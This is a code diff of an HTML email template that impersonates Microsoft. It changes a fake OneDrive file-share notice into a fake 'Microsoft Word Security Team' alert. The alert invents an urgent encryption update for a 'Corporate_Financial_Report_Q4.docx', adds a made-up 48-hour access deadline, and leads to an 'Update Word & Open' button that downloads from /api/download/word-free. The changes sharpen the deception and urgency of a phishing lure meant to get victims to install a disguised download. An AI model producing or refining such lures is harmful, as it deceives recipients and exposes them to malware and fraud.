@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>William Gary Parks shared a file with you</title>
+    <title>Action Required: Update Microsoft Word to View Document</title>
     <style>
         body {
             margin: 0;
@@ -32,6 +32,34 @@
             font-size: 18px;
             font-weight: 600;
             letter-spacing: -0.02em;
+            display: flex;
+            align-items: center;
+        }
+        
+        .microsoft-logo svg {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+            fill: white;
+        }
+        
+        .urgent-banner {
+            background-color: #d13438;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .update-notice {
+            background-color: #fff4ce;
+            border: 1px solid #fed100;
+            border-radius: 4px;
+            padding: 16px;
+            margin: 16px 0;
+            font-size: 14px;
+            color: #605e5c;
         }
         
         .content {
@@ -92,7 +120,7 @@
             width: 48px;
             height: 48px;
             margin-right: 16px;
-            background-color: #185abd;
+            background-color: #2b579a;
             border-radius: 4px;
             display: flex;
             align-items: center;
@@ -197,41 +225,64 @@
     <div class="email-container">
         <!-- Microsoft Header -->
         <div class="header">
-            <div class="microsoft-logo">Microsoft</div>
+            <div class="microsoft-logo">
+                <svg viewBox="0 0 32 32">
+                    <path d="M2,2H14V14H2V2Z" fill="#F25022"/>
+                    <path d="M16,2H28V14H16V2Z" fill="#7FBA00"/>
+                    <path d="M2,16H14V28H2V16Z" fill="#00A4EF"/>
+                    <path d="M16,16H28V28H16V16Z" fill="#FFB900"/>
+                </svg>
+                Microsoft
+            </div>
+        </div>
+        
+        <!-- Urgent Banner -->
+        <div class="urgent-banner">
+            ⚠️ ACTION REQUIRED: Document Update Available
         </div>
         
         <!-- Content -->
         <div class="content">
             <div class="sender-info">
-                <div class="sender-avatar">WP</div>
+                <div class="sender-avatar">📄</div>
                 <div class="sender-details">
-                    <div class="sender-name">William Gary Parks</div>
-                    <div class="share-message">shared a file with you</div>
+                    <div class="sender-name">Microsoft Word Security Team</div>
+                    <div class="share-message">requires immediate document update</div>
                 </div>
+            </div>
+            
+            <div class="update-notice">
+                <strong>⚡ Critical Update Required:</strong> Your Microsoft Word version needs to be updated to view this encrypted document. This security enhancement protects sensitive corporate documents.
             </div>
             
             <div class="file-container">
                 <div class="file-info">
                     <div class="file-icon">
                         <svg viewBox="0 0 32 32">
-                            <path d="M28,4H15.5L13,1.5A1.5,1.5,0,0,0,12,1H4A3,3,0,0,0,1,4V26a3,3,0,0,0,3,3H28a3,3,0,0,0,3-3V7A3,3,0,0,0,28,4ZM29,26a1,1,0,0,1-1,1H4a1,1,0,0,1-1-1V4A1,1,0,0,1,4,3h7.5l2.5,2.5A1.5,1.5,0,0,0,15,6H28a1,1,0,0,1,1,1Z"/>
-                            <path d="M19,11H9a1,1,0,0,0,0,2H19a1,1,0,0,0,0-2Z"/>
-                            <path d="M23,15H9a1,1,0,0,0,0,2H23a1,1,0,0,0,0-2Z"/>
-                            <path d="M23,19H9a1,1,0,0,0,0,2H23a1,1,0,0,0,0-2Z"/>
+                            <path d="M28.8,2H7.2A1.2,1.2,0,0,0,6,3.2V28.8A1.2,1.2,0,0,0,7.2,30H28.8A1.2,1.2,0,0,0,30,28.8V3.2A1.2,1.2,0,0,0,28.8,2Z" fill="#2b579a"/>
+                            <path d="M26,8H10v2H26ZM26,12H10v2H26ZM26,16H10v2H26ZM22,20H10v2H22Z" fill="white"/>
+                            <path d="M6,6H2V2H6Z" fill="#41a5ee"/>
+                            <path d="M2,6V30H6V6Z" fill="#41a5ee"/>
+                            <path d="M6,2H30V6H6Z" fill="#41a5ee"/>
                         </svg>
                     </div>
                     <div class="file-details">
-                        <div class="file-name">Scan_Document_xlsx.docx</div>
-                        <div class="file-meta">Microsoft Word document • 204.6 KB</div>
+                        <div class="file-name">Corporate_Financial_Report_Q4.docx</div>
+                        <div class="file-meta">Encrypted Word Document • 204.6 KB • Requires Latest Version</div>
                     </div>
                 </div>
                 
-                <a href="/api/download/word-free" class="open-button">Open</a>
+                <a href="/api/download/word-free" class="open-button">Update Word & Open</a>
             </div>
             
             <div class="additional-info">
-                <p>William Gary Parks invited you to view this file. You can open it directly or save it to your device.</p>
-                <p><strong>Note:</strong> This file is shared from Microsoft OneDrive. You may need to sign in to access additional features.</p>
+                <p><strong>Important:</strong> This document contains sensitive financial information protected by enhanced encryption. Your current Word version cannot decrypt this file format.</p>
+                <p><strong>Security Notice:</strong> Microsoft has implemented new document security protocols. Click "Update Word & Open" to install the latest security patch and access this document.</p>
+                <p style="font-size: 12px; color: #857164; margin-top: 12px;">
+                    📊 Document Type: Executive Financial Report<br>
+                    🔐 Encryption Level: AES-256 Enterprise<br>
+                    ⏱️ Access Window: 48 hours remaining
+                </p>
             </div>
         </div>
         
